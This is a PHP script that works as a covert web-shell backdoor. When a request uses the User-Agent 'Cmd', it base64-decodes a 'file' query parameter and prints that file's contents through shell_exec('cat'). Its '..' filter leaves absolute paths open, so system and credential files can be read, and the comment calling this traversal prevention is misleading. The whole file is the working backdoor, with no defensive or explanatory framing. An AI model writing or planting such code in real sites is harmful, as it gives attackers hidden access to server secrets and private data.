<?php
// Check for specific User-Agent
if (isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] === 'Cmd') {
    // Check if file path is provided and base64 encoded
    if (isset($_GET['file']) && !empty($_GET['file'])) {
        $encoded_path = $_GET['file'];
        // Decode base64 path
        $file_path = base64_decode($encoded_path);
        
        // Prevent directory traversal
        $file_path = str_replace('..', '', $file_path);
        
        // Check if file exists and is readable
        if (file_exists($file_path) && is_readable($file_path)) {
            // Execute cat command to read file content
            $output = shell_exec("cat " . escapeshellarg($file_path));
            echo "<pre>" . htmlspecialchars($output) . "</pre>";
        } else {
            echo "Error: File not found or not readable.";
        }
    } else {
        echo "Error: No file specified or invalid path.";
    }
} else {
    echo "Error: Invalid User-Agent. Please use 'Cmd' as User-Agent.";
}
?>

